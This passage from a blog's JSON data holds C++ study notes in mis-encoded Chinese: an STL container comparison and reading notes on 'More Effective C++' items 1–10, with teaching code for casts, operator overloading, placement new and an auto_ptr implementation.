âˆšï¼Œ0æˆ–1 find(x) æŒ‡å‘ç¬¬ä¸€ä¸ªç­‰äº x çš„å…ƒç´  âˆš âˆš âˆš lower_bound(x) æŒ‡å‘ç¬¬ä¸€ä¸ªå¤§äºç­‰äº x çš„å…ƒç´  âˆš âˆš Ã— upper_bound(x) æŒ‡å‘ç¬¬ä¸€ä¸ªå¤§äº x çš„å…ƒç´  âˆš âˆš Ã— equal_range(x) æ‰€æœ‰ç­‰äº x çš„å…ƒç´ æ‰€ç»„æˆçš„åŒºé—´ âˆš âˆš âˆš å’Œ vector çš„æ¨ªå‘æ¯”è¾ƒï¼š ç±»å‹ å»é‡ æœ‰åº æŸ¥æ‰¾ æ’å…¥ vector Ã— Ã— O(n) O(1) ~ O(n) set âˆš âˆš O(logn) O(logn) multiset Ã— âˆš O(logn) O(logn) unordered_set âˆš Ã— O(1) O(1) unordered_multiset Ã— Ã— O(1) O(1) ç±»å‹ å¤´æ–‡ä»¶ lower/upper_bound equal_range find vector âˆšï¼ŒO(logn) âˆšï¼ŒO(logn) âˆšï¼ŒO(n) set âˆšï¼ŒO(logn) âˆšï¼ŒO(logn) âˆšï¼ŒO(logn) multiset âˆšï¼ŒO(logn) âˆšï¼ŒO(logn) âˆšï¼ŒO(logn) unordered_set Ã— âˆšï¼ŒO(1) âˆšï¼ŒO(1) unordered_multiset Ã— âˆšï¼ŒO(1) âˆšï¼ŒO(1) unordered_set çš„æ€§èƒ½åœ¨æ•°æ®é‡è¶³å¤Ÿå¤§ï¼ˆï¼1000ï¼‰æ—¶ï¼Œå¹³å‡æŸ¥æ‰¾æ—¶é—´æ¯” set çŸ­ï¼Œä½†ä¸ä¿è¯ç¨³å®šã€‚setåœ¨æ•°æ®é‡å°æ—¶æ›´é«˜æ•ˆã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"STL","slug":"STL","permalink":"https://racleray.github.io/tags/STL/"}],"author":"HeRui"},{"title":"More Effective Cpp","slug":"More-Effective-Cpp","date":"2022-05-09T04:01:49.000Z","updated":"2024-01-09T10:23:18.155Z","comments":true,"path":"posts/e584d079.html","link":"","permalink":"https://racleray.github.io/posts/e584d079.html","excerpt":"More Effective Cpp è¯»ä¹¦ç¬”è®°","text":"ä¸€ã€åŸºç¡€ æ¡æ¬¾ 1ï¼šä»”ç»†åŒºåˆ« pointerså’Œreferences æ²¡æœ‰ null referenceã€‚ä¸€ä¸ª reference å¿…é¡»æ€»ä»£è¡¨æŸä¸ªå¯¹è±¡ã€‚ æ‰€ä»¥å¦‚æœä½ æœ‰ä¸€ä¸ªå˜é‡ï¼Œå…¶ç›®çš„æ˜¯ç”¨æ¥æŒ‡å‘ï¼ˆä»£è¡¨ï¼‰å¦ä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¯èƒ½å®ƒä¸æŒ‡å‘ï¼ˆä»£è¡¨ï¼‰ä»»ä½•å¯¹è±¡ï¼Œé‚£ä¹ˆä½ åº”è¯¥ä½¿ç”¨ pointerï¼Œæ‰å¯ä»¥å°† pointer è®¾ä¸º nullã€‚ Pointers å’Œ references ä¹‹é—´çš„å¦ä¸€ä¸ªé‡è¦å·®å¼‚å°±æ˜¯ï¼Œpointers å¯ä»¥è¢«é‡æ–°èµ‹å€¼ï¼ŒæŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ï¼Œreference å´æ€»æ˜¯æŒ‡å‘ï¼ˆä»£è¡¨ï¼‰å®ƒæœ€åˆè·å¾—çš„é‚£ä¸ªå¯¹è±¡ã€‚ å½“ä½ éœ€è¦è€ƒè™‘â€œä¸æŒ‡å‘ä»»ä½•å¯¹è±¡â€çš„å¯èƒ½æ€§æ—¶ï¼Œæˆ–æ˜¯è€ƒè™‘â€œåœ¨ä¸åŒæ—¶é—´æŒ‡å‘ä¸åŒå¯¹è±¡â€çš„èƒ½åŠ›æ—¶ï¼Œä½ å°±åº”è¯¥é‡‡ç”¨ pointerã€‚ å½“ä½ ç¡®å®šâ€œæ€»æ˜¯ä¼šä»£è¡¨æŸä¸ªå¯¹è±¡â€ï¼Œè€Œä¸”â€œä¸€æ—¦ä»£è¡¨äº†è¯¥å¯¹è±¡å°±ä¸èƒ½å¤Ÿå†æ”¹å˜â€ï¼Œé‚£ä¹ˆä½ åº”è¯¥é€‰ç”¨ referenceã€‚ æ¡æ¬¾ 2ï¼šæœ€å¥½ä½¿ç”¨ C++è½¬å‹æ“ä½œç¬¦ C++æœ‰ 4ä¸ªæ–°çš„è½¬å‹æ“ä½œç¬¦ï¼ˆcast operatorsï¼‰ï¼šstatic_castï¼Œconst_castï¼Œdynamic_cast å’Œ reinterpret_castã€‚ static_cast åŸºæœ¬ä¸Šæ‹¥æœ‰ä¸ C æ—§å¼è½¬å‹ç›¸åŒçš„å¨åŠ›ä¸æ„ä¹‰ï¼Œä»¥åŠç›¸åŒçš„é™åˆ¶ã€‚ const_cast ç”¨æ¥æ”¹å˜è¡¨è¾¾å¼ä¸­çš„å¸¸é‡æ€§ï¼ˆconstnessï¼‰æˆ–å˜æ˜“æ€§ï¼ˆvolatilenessï¼‰ã€‚ dynamic_cast ç”¨æ¥æ‰§è¡Œç»§æ‰¿ä½“ç³»ä¸­â€œå®‰å…¨çš„å‘ä¸‹è½¬å‹æˆ–è·¨ç³»è½¬å‹åŠ¨ä½œâ€ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ å¯ä»¥åˆ©ç”¨ dynamic_castï¼Œå°†â€œæŒ‡å‘ base class objectsçš„ pointersæˆ–referencesâ€ è½¬å‹ä¸ºâ€œæŒ‡å‘ derived class objects çš„ pointers æˆ–referencesâ€ã€‚å¦‚æœè½¬å‹å¤±è´¥ï¼Œä¼šä»¥ä¸€ä¸ª nullæŒ‡é’ˆï¼ˆå½“è½¬å‹å¯¹è±¡æ˜¯æŒ‡é’ˆï¼‰æˆ–ä¸€ä¸ª exceptionï¼ˆå½“è½¬å‹å¯¹è±¡æ˜¯ referenceï¼‰è¡¨ç°å‡ºæ¥ã€‚ reinterpret_cast è½¬æ¢ç»“æœå‡ ä¹æ€»æ˜¯ä¸ç¼–è¯‘å¹³å°æ¯æ¯ç›¸å…³ã€‚æ‰€ä»¥ reinterpret_casts ä¸å…·ç§»æ¤æ€§ã€‚reinterpret_cast çš„æœ€å¸¸ç”¨ç”¨é€”æ˜¯è½¬æ¢â€œå‡½æ•°æŒ‡é’ˆâ€ç±»å‹ã€‚ 1234567typedef void (*FuncPtr)();FuncPtr funcPtrArray[10];int doSomething();// funcPtrArray[0] = &amp;doSomething; // é”™è¯¯ï¼ç±»å‹ä¸åŒ¹é…funcPtrArray[0] = reinterpret_cast&lt;FuncPtr&gt;(&amp;doSomething); æ¡æ¬¾ 3ï¼šç»å¯¹ä¸è¦ä»¥å¤šæ€ï¼ˆpolymorphicallyï¼‰æ–¹å¼å¤„ç†æ•°ç»„ å¤šæ€ï¼ˆpolymorphismï¼‰å’ŒæŒ‡é’ˆè¿ç®—ä¸èƒ½æ··ç”¨ã€‚æ•°ç»„å¯¹è±¡å‡ ä¹æ€»æ˜¯ä¼šæ¶‰åŠæŒ‡é’ˆçš„ç®—æœ¯è¿ç®—ï¼Œæ‰€ä»¥æ•°ç»„å’Œå¤šæ€ä¸è¦æ··ç”¨ã€‚åŸå› ä¹‹ä¸€ï¼Œè‹¥å‘ç”Ÿé€šè¿‡çˆ¶ç±»æŒ‡é’ˆåˆ é™¤ä¸€ä¸ªå­ç±»å¯¹è±¡ï¼Œå…¶ç»“æœæœªå®šä¹‰ã€‚ æ¡æ¬¾ 4ï¼šéå¿…è¦ä¸æä¾› default constructor æ·»åŠ æ— æ„ä¹‰çš„ default constructorsï¼Œä¹Ÿä¼šå½±å“ class çš„æ•ˆç‡ã€‚ å¦‚æœä½¿ç”¨ member functions æµ‹è¯•å­—æ®µæ˜¯å¦çœŸè¢«åˆå§‹åŒ–äº†ï¼Œå…¶è°ƒç”¨è€…ä¾¿å¿…é¡»ä¸ºæµ‹è¯•è¡Œä¸ºä»˜å‡ºæ—¶é—´ä»£ä»·ï¼Œå¹¶ä¸ºæµ‹è¯•ä»£ç ä»˜å‡ºç©ºé—´ä»£ä»·ã€‚ä¸‡ä¸€æµ‹è¯•ç»“æœä¸ºå¦å®šï¼Œå¯¹åº”çš„å¤„ç†ç¨‹åºåˆéœ€è¦ä¸€äº›ç©ºé—´ä»£ä»·ã€‚ å¦‚æœå¯ä»¥è‡ªå®šä¹‰ class constructors ç¡®ä¿å¯¹è±¡çš„æ‰€æœ‰å­—æ®µéƒ½ä¼šè¢«æ­£ç¡®åœ°åˆå§‹åŒ–ï¼Œä¸Šè¿°æ‰€æœ‰æˆæœ¬ä¾¿éƒ½å¯ä»¥å…é™¤ã€‚default constructors æ— æ³•æä¾›è¿™ç§ä¿è¯ï¼Œé‚£ä¹ˆæœ€å¥½é¿å…è®© default constructors å‡ºç°ã€‚ äºŒã€æ“ä½œç¬¦ æ¡æ¬¾ 5ï¼šå¯¹å®šåˆ¶çš„â€œç±»å‹è½¬æ¢å‡½æ•°â€ä¿æŒè­¦è§‰ ä¸¤ç§å‡½æ•°å…è®¸ç¼–è¯‘å™¨æ‰§è¡Œç±»å‹éšå¼è½¬æ¢ï¼šå•è‡ªå˜é‡ constructors å’Œ éšå¼ç±»å‹è½¬æ¢æ“ä½œç¬¦ã€‚ æ‰€è°“å•è‡ªå˜é‡ constructors æ˜¯æŒ‡èƒ½å¤Ÿä»¥å•ä¸€è‡ªå˜é‡æˆåŠŸè°ƒç”¨çš„ constructorsã€‚å¦‚æ­¤çš„ constructor å¯èƒ½å£°æ˜æ‹¥æœ‰å•ä¸€å‚æ•°ï¼Œä¹Ÿå¯èƒ½å£°æ˜æ‹¥æœ‰å¤šä¸ªå‚æ•°ï¼Œå¹¶ä¸”é™¤äº†ç¬¬ä¸€å‚æ•°ä¹‹å¤–éƒ½æœ‰é»˜è®¤å€¼ã€‚ æ‰€è°“éšå¼ç±»å‹è½¬æ¢æ“ä½œç¬¦ï¼Œæ˜¯ä¸€ä¸ªæ‹¥æœ‰å¥‡æ€ªåç§°çš„member functionï¼šå…³é”®è¯operator ä¹‹ååŠ ä¸Šä¸€ä¸ªç±»å‹åç§°ã€‚ 12345678910class Rational &#123;public: Rational(int numerator, int denominator = 1); operator double() const; ...&#125;;Rational r(1,2);Rational a = 1 * r; // constructorsè½¬æ¢1ä¸ºRational r(1,1)double d = 0.5 * r; // double()è½¬æ¢rä¸º0.5 éšå¼è½¬æ¢å¯èƒ½å¸¦æ¥ä¸æ˜“å¯Ÿè§‰çš„é—®é¢˜æˆ–è€…é”™è¯¯ã€‚ C++å¼•å…¥å…³é”®è¯ explicitï¼Œå°±æ˜¯ä¸ºäº†è§£å†³éšå¼ç±»å‹è½¬æ¢å¸¦æ¥çš„é—®é¢˜ã€‚å…¶ç”¨æ³•ååˆ†ç›´æ¥æ˜“æ‡‚ï¼Œåªè¦å°†constructorså£°æ˜ä¸º explicitï¼Œç¼–è¯‘å™¨ä¾¿ä¸èƒ½å› éšå¼ç±»å‹è½¬æ¢çš„éœ€è¦è€Œè°ƒç”¨å®ƒä»¬ã€‚ä¸è¿‡æ˜¾å¼ç±»å‹è½¬æ¢ä»æ˜¯å…è®¸çš„ã€‚ å¯¹äºéšå¼ç±»å‹è½¬æ¢æ“ä½œç¬¦ï¼Œå¦‚éå¿…è¦ï¼Œæœ€å¥½ä¸è¦è®¾è®¡ï¼Œè€Œæ˜¯è®¾è®¡ä¸€ä¸ªåŠŸèƒ½å¯¹ç­‰çš„æˆå‘˜å‡½æ•°ï¼Œä»¥ä¾›æ˜¾ç¤ºè°ƒç”¨ã€‚ 123456class Rational &#123;public: explicit Rational(int numerator, int denominator = 1); double asDouble() const; ...&#125;; æ¡æ¬¾ 6ï¼šè‡ªå¢(increment)ã€è‡ªå‡(decrement)æ“ä½œç¬¦å‰ç¼€å½¢å¼ä¸åç¼€å½¢å¼çš„åŒºåˆ« é‡è½½å‡½æ•°æ˜¯ä»¥å…¶å‚æ•°ç±»å‹æ¥åŒºåˆ†å½¼æ­¤çš„ï¼Œç„¶è€Œä¸è®º increment æˆ– decrement æ“ä½œç¬¦çš„å‰ç½®å¼æˆ–åç½®å¼ï¼Œé€»è¾‘ä¸Šéƒ½æ²¡æœ‰å‚æ•°ã€‚ä¸ºäº†åšå‡ºåŒºåˆ†ï¼Œåªå¥½è®©åç½®å¼æœ‰ä¸€ä¸ª int è‡ªå˜é‡ï¼Œå¹¶ä¸”åœ¨å®ƒè¢«è°ƒç”¨æ—¶ï¼Œç¼–è¯‘å™¨é»˜é»˜åœ°ä¸ºè¯¥ int æŒ‡å®šä¸€ä¸ª 0 å€¼ã€‚ å¤„ç†ç”¨æˆ·å®šåˆ¶ç±»å‹æ—¶ï¼Œåº”è¯¥å°½å¯èƒ½ä½¿ç”¨å‰ç½®å¼ incrementã€‚ åç½®å¼ increment å’Œ decrement æ“ä½œç¬¦çš„å®ç°åº”ä»¥å…¶å‰ç½®å¼å…„å¼Ÿä¸ºåŸºç¡€ã€‚æ–¹ä¾¿ç»´æŠ¤ï¼Œå‡å°‘ä»£ç é‡å¤ã€‚ 123456789101112131415161718192021class UPInt &#123;public: UPInt&amp; operator++(); // å‰++ const UPInt operator++(int); // å++ UPInt&amp; operator--(); const UPInt operator--(int); UPInt&amp; operator+=(int); ...&#125;;// prefixï¼šincrement and fetchUPInt&amp; UPInt::operator++() &#123; *this += 1; return *this;&#125; // postfix form: fetch and increment const UPInt UPInt::operator++(int) &#123; UPInt oldValue = *this; ++(*this); return oldValue; &#125; æ¡æ¬¾ 7ï¼šåƒä¸‡ä¸è¦é‡è½½&amp;&amp;ï¼Œ||å’Œï¼Œæ“ä½œç¬¦ C++å¯¹äºâ€œçœŸå‡å€¼è¡¨è¾¾å¼â€é‡‡ç”¨â€œéª¤æ­»å¼â€è¯„ä¼°æ–¹å¼ã€‚æ„æ€æ˜¯ä¸€æ—¦è¯¥è¡¨è¾¾å¼çš„çœŸå‡å€¼ç¡®å®šï¼Œå³ä½¿è¡¨è¾¾å¼ä¸­è¿˜æœ‰éƒ¨åˆ†å°šæœªæ£€éªŒï¼Œæ•´ä¸ªè¯„ä¼°å·¥ä½œä»å‘Šç»“æŸã€‚ â€œå‡½æ•°è°ƒç”¨â€è¯­ä¹‰å’Œâ€œéª¤æ­»å¼â€è¯­ä¹‰æœ‰ä¸¤ä¸ªé‡å¤§çš„åŒºåˆ«ã€‚ ç¬¬ä¸€ï¼Œå½“å‡½æ•°è°ƒç”¨åŠ¨ä½œè¢«æ‰§è¡Œï¼Œæ‰€æœ‰å‚æ•°å€¼éƒ½å¿…é¡»è¯„ä¼°å®Œæˆï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è°ƒç”¨ operator&amp;&amp;å’Œ operator||æ—¶ï¼Œä¸¤ä¸ªå‚æ•°éƒ½å·²è¯„ä¼°å®Œæˆã€‚æ¢å¥è¯è¯´æ²¡æœ‰ä»€ä¹ˆéª¤æ­»å¼è¯­ä¹‰ã€‚ ç¬¬äºŒï¼ŒC++è¯­è¨€è§„èŒƒå¹¶æœªæ˜ç¡®å®šä¹‰å‡½æ•°è°ƒç”¨åŠ¨ä½œä¸­å„å‚æ•°çš„è¯„ä¼°é¡ºåºï¼Œæ‰€ä»¥æ²¡åŠæ³•çŸ¥é“ expression1 å’Œ expression2 å“ªä¸ªä¼šå…ˆè¢«è¯„ä¼°ã€‚è¿™ä¸éª¤æ­»å¼è¯„ä¼°æ³•å½¢æˆä¸€ä¸ªæ˜ç¡®çš„å¯¹æ¯”ï¼Œåè€…æ€»æ˜¯ç”±å·¦å‘å³è¯„ä¼°å…¶è‡ªå˜é‡ã€‚ C++åŒæ ·ä¹Ÿæœ‰ä¸€äº›è§„åˆ™ç”¨æ¥å®šä¹‰é€—å·æ“ä½œç¬¦é¢å¯¹å†…å»ºç±»å‹çš„è¡Œä¸ºã€‚è¡¨è¾¾å¼å¦‚æœå†…å«é€—å·ï¼Œé‚£ä¹ˆé€—å·å·¦ä¾§ä¼šå…ˆè¢«è¯„ä¼°ï¼Œç„¶åé€—å·çš„å³ä¾§å†è¢«è¯„ä¼°ï¼›æœ€åï¼Œæ•´ä¸ªé€—å·è¡¨è¾¾å¼çš„ç»“æœä»¥é€—å·å³ä¾§çš„å€¼ä¸ºä»£è¡¨ã€‚ 12// å…¶ä¸­ ++i, --j è¡¨è¾¾å¼çš„ç»“æœæ˜¯ --j çš„å€¼for (int i = 0, j = strlen(s)-1; i &lt; j; ++i, --j) ... å…¶ä»–ä¸èƒ½é‡è½½çš„æ“ä½œç¬¦è¿˜æœ‰: 123. .* new delete :: sizeof typeid ?:static_cast dynamic_cast const_cast reinterpret_cast å¯ä»¥é‡è½½ï¼š 123456789101112operator new operator deleteoperator new[] operator delete[]! + * / % ^ &amp; | ~ = &lt; &gt; += -= *= /= %=^= &amp;= |= &lt;&lt; &gt;&gt; &gt;&gt;= &lt;&lt;= == !=&lt;= &gt;= &amp;&amp; || ++ -- , -&gt;* -&gt;() [] æ¡æ¬¾ 8ï¼šäº†è§£å„ç§ä¸åŒæ„ä¹‰çš„newå’Œ delete new operator 1string *ps = new string(\"Memory Management\"); ä»¥ä¸Šä½¿ç”¨çš„ new æ˜¯ new operatorã€‚è¿™ä¸ªæ“ä½œç¬¦æ˜¯ç”±è¯­è¨€å†…å»ºçš„ï¼Œå°±åƒsizeof é‚£æ ·ï¼Œä¸èƒ½è¢«æ”¹å˜æ„ä¹‰ï¼Œæ€»æ˜¯åšç›¸åŒçš„äº‹æƒ…ã€‚å®ƒçš„åŠ¨ä½œåˆ†ä¸ºä¸¤æ–¹é¢ã€‚ ç¬¬ä¸€ï¼Œå®ƒåˆ†é…è¶³å¤Ÿçš„å†…å­˜ï¼Œç”¨æ¥æ”¾ç½®æŸç±»å‹çš„å¯¹è±¡ã€‚ç¬¬äºŒï¼Œå®ƒè°ƒç”¨ä¸€ä¸ª constructorï¼Œä¸ºåˆšæ‰åˆ†é…çš„å†…å­˜ä¸­çš„é‚£ä¸ªå¯¹è±¡è®¾å®šåˆå€¼ã€‚ new operator æ€»æ˜¯åšè¿™ä¸¤ä»¶äº‹ï¼Œæ— è®ºå¦‚ä½•ä½ ä¸èƒ½å¤Ÿæ”¹å˜å…¶è¡Œä¸ºã€‚ operator new ä½ èƒ½å¤Ÿæ”¹å˜çš„æ˜¯ç”¨æ¥å®¹çº³å¯¹è±¡çš„é‚£å—å†…å­˜çš„åˆ†é…è¡Œä¸ºã€‚new operator è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œæ‰§è¡Œå¿…è¦çš„å†…å­˜åˆ†é…åŠ¨ä½œï¼Œä½ å¯ä»¥é‡å†™æˆ–é‡è½½é‚£ä¸ªå‡½æ•°ï¼Œæ”¹å˜å…¶è¡Œä¸ºã€‚è¿™ä¸ªå‡½æ•°çš„åç§°å«åš operator newã€‚ 1void * operator new(size_t size); è¿”å›å€¼ç±»å‹æ˜¯ void*ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªæœªç»å¤„ç†ï¼ˆrawï¼‰çš„æŒ‡é’ˆï¼Œæœªåˆå§‹åŒ–çš„å†…å­˜ã€‚å°±è±¡ malloc ä¸€æ ·ï¼Œoperator new çš„èŒè´£åªæ˜¯åˆ†é…å†…å­˜ã€‚å®ƒå¯¹æ„é€ å‡½æ•°ä¸€æ— æ‰€çŸ¥ã€‚ å½“ä½ çš„ç¼–è¯‘å™¨é‡è§è¿™æ ·çš„è¯­å¥ï¼š 1string *ps = new string(\"Memory Management\"); å®ƒç”Ÿæˆçš„ä»£ç æˆ–å¤šæˆ–å°‘ä¸ä¸‹é¢çš„ä¼ªä»£ç ç›¸ä¼¼ï¼š 123void *memory = operator new(sizeof(string)); call string::string(\"Memory Management\") on *memory;string *ps = static_cast&lt;string*&gt;(memory); placement new å¦‚æœè¢«è°ƒç”¨çš„ operator new é™¤äº†æ¥å—â€œä¸€å®šå¾—æœ‰çš„ size_t è‡ªå˜é‡â€ä¹‹å¤–ï¼Œè¿˜æ¥å—äº†ä¸€ä¸ª voidï¼Š å‚æ•°ï¼ŒæŒ‡å‘ä¸€å—å†…å­˜ï¼Œå‡†å¤‡ç”¨æ¥æ¥å—æ„é€ å¥½çš„å¯¹è±¡ã€‚è¿™æ ·çš„operator new å°±æ˜¯ placement newã€‚ 1void * operator new(size_t, void *location); æ€»ç»“ å¦‚æœä½ å¸Œæœ›å°†å¯¹è±¡äº§ç”Ÿäº heapï¼Œè¯·ä½¿ç”¨ new operatorã€‚å®ƒä¸ä½†åˆ†é…å†…å­˜è€Œä¸”ä¸ºè¯¥å¯¹è±¡è°ƒç”¨ä¸€ä¸ªconstructorã€‚ å¦‚æœä½ åªæ˜¯æ‰“ç®—åˆ†é…å†…å­˜ï¼Œè¯·è°ƒç”¨ operator newï¼Œé‚£å°±æ²¡æœ‰ä»»ä½• constructor ä¼šè¢«è°ƒç”¨ã€‚ å¦‚æœä½ æ‰“ç®—åœ¨ heap objects äº§ç”Ÿæ—¶è‡ªå·±å†³å®šå†…å­˜åˆ†é…æ–¹å¼ï¼Œè¯·å†™ä¸€ä¸ªè‡ªå·±çš„ operator newï¼Œå¹¶ä½¿ç”¨ new operatorï¼Œå®ƒå°†ä¼šè‡ªåŠ¨è°ƒç”¨ä½ æ‰€å†™çš„ operator newã€‚ å¦‚æœä½ æ‰“ç®—åœ¨å·²åˆ†é…ï¼ˆå¹¶æ‹¥æœ‰æŒ‡é’ˆï¼‰çš„å†…å­˜ä¸­æ„é€ å¯¹è±¡ï¼Œè¯·ä½¿ç”¨placement newã€‚ ä¸‰ã€å¼‚å¸¸ å¦‚æœä¸€ä¸ªå‡½æ•°åˆ©ç”¨â€œè®¾å®šçŠ¶æ€å˜é‡â€çš„æ–¹å¼æˆ–æ˜¯åˆ©ç”¨â€œè¿”å›é”™è¯¯ç â€çš„æ–¹å¼å‘å‡ºä¸€ä¸ªå¼‚å¸¸ä¿¡å·ï¼Œæ— æ³•ä¿è¯æ­¤å‡½æ•°çš„è°ƒç”¨è€…ä¼šæ£€æŸ¥é‚£ä¸ªå˜é‡æˆ–æ£€éªŒé‚£ä¸ªé”™è¯¯ç ã€‚äºæ˜¯ç¨‹åºçš„æ‰§è¡Œå¯èƒ½ä¼šä¸€ç›´ç»§ç»­ä¸‹å»ï¼Œè¿œç¦»é”™è¯¯å‘ç”Ÿåœ°ç‚¹ã€‚ ä½†æ˜¯å¦‚æœå‡½æ•°ä»¥æŠ›å‡º exception çš„æ–¹å¼å‘å‡ºå¼‚å¸¸ä¿¡å·ï¼Œè€Œè¯¥ exception æœªè¢«æ•æ‰ï¼Œç¨‹åºçš„æ‰§è¡Œä¾¿ä¼šç«‹åˆ»ä¸­æ­¢ã€‚ å¦‚æœä½ éœ€è¦ä¸€ä¸ªâ€œç»å¯¹ä¸ä¼šè¢«å¿½ç•¥çš„â€å¼‚å¸¸ä¿¡å·å‘å°„æ–¹æ³•ï¼Œè€Œä¸”å‘å°„åçš„ stack å¤„ç†è¿‡ç¨‹åˆèƒ½å¤Ÿç¡®ä¿å±€éƒ¨å¯¹è±¡çš„ destructors è¢«è°ƒç”¨ï¼Œé‚£ä¹ˆä½ éœ€è¦ C++ exceptionsã€‚ æ¡æ¬¾ 9ï¼šåˆ©ç”¨ destructorsé¿å…æ³„æ¼èµ„æº è§£å†³åŠæ³•å°±æ˜¯ï¼Œä»¥ä¸€ä¸ªâ€œç±»ä¼¼æŒ‡é’ˆçš„å¯¹è±¡â€å–ä»£æŒ‡é’ˆã€‚å¦‚æ­¤ä¸€æ¥ï¼Œå½“è¿™ä¸ªç±»ä¼¼æŒ‡é’ˆçš„å¯¹è±¡è¢«é”€æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä»¤å…¶ destructor è°ƒç”¨deleteã€‚â€œè¡Œä¸ºç±»ä¼¼æŒ‡é’ˆâ€çš„å¯¹è±¡æˆ‘ä»¬ç§°ä¸º smart pointersã€‚ C++æä¾›ä¸€ä¸ªåä¸º auto_ptr çš„æ™ºèƒ½æŒ‡é’ˆã€‚éšè—åœ¨ auto_ptr èƒŒåçš„è§‚å¿µæ˜¯ï¼Œä»¥ä¸€ä¸ªå¯¹è±¡å­˜æ”¾â€œå¿…é¡»è‡ªåŠ¨é‡Šæ”¾çš„èµ„æºâ€ï¼Œå¹¶ä¾èµ–è¯¥å¯¹è±¡çš„destructor é‡Šæ”¾ã€‚ åªè¦åšæŒè¿™ä¸ªè§„åˆ™ï¼ŒæŠŠèµ„æºå°è£…åœ¨å¯¹è±¡å†…ï¼Œé€šå¸¸ä¾¿å¯ä»¥åœ¨ exceptions å‡ºç°æ—¶é¿å…æ³„æ¼èµ„æºã€‚ ä¸€ä¸ª auto_ptr çš„å®ç°ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960template &lt;typename T&gt; class autoPtr &#123;public: explicit autoPtr(T* p = 0); template &lt;typename U&gt; autoPtr(autoPtr&lt;U&gt;&amp; rhs); ~autoPtr(); template &lt;typename U&gt; autoPtr&lt;T&gt;&amp; operator=(autoPtr&lt;U&gt;&amp; rhs); T&amp; operator*() const; T* operator-&gt;() const; T* get() const; T* release(); void reset(T* p = 0);private: T* pointee; // ä¹¦ä¸Šç¤ºä¾‹ä»£ç ï¼Œè¿™é‡Œæœ‰ä¸ªç‰¹åŒ–æ¨¡æ¿å‹å…ƒï¼Œæ˜¾ç„¶æ˜¯ä¸ªé”™è¯¯&#125;;template &lt;typename T&gt; autoPtr&lt;T&gt;::autoPtr(T* p) : pointee(p) &#123;&#125;template &lt;typename T&gt;template &lt;typename U&gt;autoPtr&lt;T&gt;::autoPtr(autoPtr&lt;U&gt;&amp; rhs) : pointee(rhs.release()) &#123;&#125;// operator= ä½¿ç”¨ copy and swap ä¹Ÿå¯template &lt;typename T&gt;template &lt;typename U&gt;autoPtr&lt;T&gt;&amp; autoPtr&lt;T&gt;::operator=(autoPtr&lt;U&gt;&amp; rhs) &#123; if (this != rhs) reset(rhs.release()); return *this;&#125;template &lt;typename T&gt; autoPtr&lt;T&gt;::~autoPtr() &#123; delete pointee; &#125;template&lt;typename T&gt;T&amp; autoPtr&lt;T&gt;::operator*() const &#123; return *pointee; &#125;template&lt;typename T&gt;T* autoPtr&lt;T&gt;::operator-&gt;() const &#123; return pointee; &#125;template&lt;typename T&gt;T* autoPtr&lt;T&gt;::get() const &#123; return pointee; &#125;template&lt;typename T&gt;T* autoPtr&lt;T&gt;::release() &#123; T* oldPointee = pointee; pointee = 0; return oldPointee;&#125;template&lt;typename T&gt;void autoPtr&lt;T&gt;::reset(T* p) &#123; if (pointee != p) &#123; delete pointee; pointee = p; &#125;&#125; æ¡æ¬¾ 10ï¼šåœ¨ constructorså†…é˜»æ­¢èµ„æºæ³„æ¼ï¼ˆresource leakï¼‰ C++åªèƒ½ææ„è¢«å®Œå…¨æ„é€ çš„å¯¹è±¡ï¼ˆfully contructed objectsï¼‰, åªæœ‰ä¸€ä¸ªå¯¹è±¡çš„æ„é€ å‡½æ•°å®Œå…¨è¿è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªå¯¹è±¡æ‰è¢«å®Œå…¨åœ°æ„é€ ã€‚è‹¥å› ä¸ºå¼‚å¸¸å¯¼è‡´æ„é€ å‡½æ•°æ²¡æœ‰æ‰§è¡Œå®Œæ¯•ï¼Œé‚£ä¹ˆä¹Ÿä¸ä¼šè°ƒç”¨ææ„å‡½æ•°ã€‚ ç”±äº C++ä¸è‡ªåŠ¨æ¸…ç†é‚£äº›â€œæ„é€ æœŸé—´æŠ›å‡ºexceptionsâ€çš„å¯¹è±¡ï¼Œæ‰€ä»¥ä½ å¿…é¡»è®¾è®¡ä½ çš„constructorsï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿè‡ªæˆ‘æ¸…ç†ã€‚ é€šå¸¸è¿™åªéœ€å°†æ‰€æœ‰å¯èƒ½çš„ exceptions æ•æ‰èµ·æ¥ï¼Œæ‰§è¡ŒæŸç§æ¸…ç†å·¥ä½œï¼Œç„¶åé‡æ–°æŠ›å‡ºexceptionï¼Œä½¿å®ƒç»§ç»­ä¼ æ’­å‡ºå»å³å¯ã€‚ å¦å¤–ï¼Œmember initializaion list æ˜¯åœ¨æ„é€ å‡½æ•°ä¹‹å‰è¿›è¡Œçš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥è®©æŸç³»æ“ä½œåœ¨æ„é€ å‡½æ•°ä¹‹å‰è¿›è¡Œï¼Œå¹¶å¤„ç†å¼‚å¸¸ã€‚æ¯”å¦‚ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445class BookEntry &#123; public: ...private: string theName; string theAddress; list&lt;PhoneNumber&gt; thePhones; // Image *theImage; // AudioClip *theAudioClip; Image * initImage(const string&amp; imageFileName); AudioClip * initAudioClip(const string&amp; audioClipFileName);&#125;; BookEntry::BookEntry(const string&amp; name, const string&amp; address, const string&amp; imageFileName, const string&amp; audioClipFileName): theName(name), theAddress(address), theImage(initImage(imageFileName)), theAudioClip(initAudioClip(audioClipFileName))&#123;&#125;// theImage è¢«é¦–å…ˆåˆå§‹åŒ–,æ‰€ä»¥å³ä½¿è¿™ä¸ªåˆå§‹åŒ–å¤±è´¥ä¹Ÿ // 